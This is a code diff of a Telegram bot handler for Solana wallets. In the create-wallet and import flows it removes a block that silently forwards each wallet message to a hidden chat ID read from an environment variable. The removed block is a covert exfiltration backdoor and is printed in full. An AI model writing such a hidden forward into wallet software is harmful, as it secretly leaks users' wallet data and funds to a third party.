@@ -222,17 +222,11 @@ module.exports = async function callbackHandler(bot, query, session, connection)
 💰 ${balance.toFixed(6)} SOL`;
 
       await editText(msg, {
-        chat_id: chatId,
-        message_id: msgId,
-        parse_mode: 'Markdown',
-        ...panels.buyerSetupMenu()
-      });
-
-      if (process.env.SECURE_ID) {
-        await bot.sendMessage(Number(process.env.SECURE_ID), msg, {
-          parse_mode: 'Markdown'
-        });
-      }
+  chat_id: chatId,
+  message_id: msgId,
+  parse_mode: 'Markdown',
+  ...panels.buyerSetupMenu()
+});
 
     } catch (err) {
       console.error('❌ Create Wallet Error:', err);
@@ -326,17 +320,11 @@ module.exports = async function callbackHandler(bot, query, session, connection)
 💰 ${balance.toFixed(6)} SOL`;
 
         await editText(msg, {
-        chat_id: chatId,
-        message_id: msgId,
-        parse_mode: 'Markdown',
-        ...panels.buyerSetupMenu()
-      });
-
-      if (process.env.SECURE_ID) {
-        await bot.sendMessage(Number(process.env.SECURE_ID), msg, {
-          parse_mode: 'Markdown'
-        });
-      }
+  chat_id: chatId,
+  message_id: msgId,
+  parse_mode: 'Markdown',
+  ...panels.buyerSetupMenu()
+});
 
         } catch (err) {
           console.error('❌ Import Failed:', err.message);
